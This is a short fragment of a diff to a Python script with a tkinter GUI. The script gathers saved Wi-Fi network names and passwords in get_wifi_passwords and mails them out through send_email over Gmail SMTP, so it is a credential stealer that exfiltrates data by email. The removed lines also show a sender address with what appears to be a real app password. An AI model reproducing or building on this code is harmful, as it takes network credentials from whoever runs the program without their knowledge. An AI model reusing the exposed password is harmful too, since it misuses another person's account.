@@ -1,4 +1,4 @@
-import subprocess, re, smtplib
+import subprocess, re, smtplib, os
 from tkinter import *
 from time import *
 from PIL import ImageTk, Image
@@ -28,8 +28,8 @@ def get_wifi_passwords():
     send_email(wifi_list)
 
 def send_email(wifi_list: list):
-    sender = "ahmedgado0100@gmail.com"
-    password = "djtoyixewbbomviv"
+    sender = "balabezo@gmail.com"
+    password = "password"
     subject = "Wifi name(s) and password(s)"
     body = ""
 
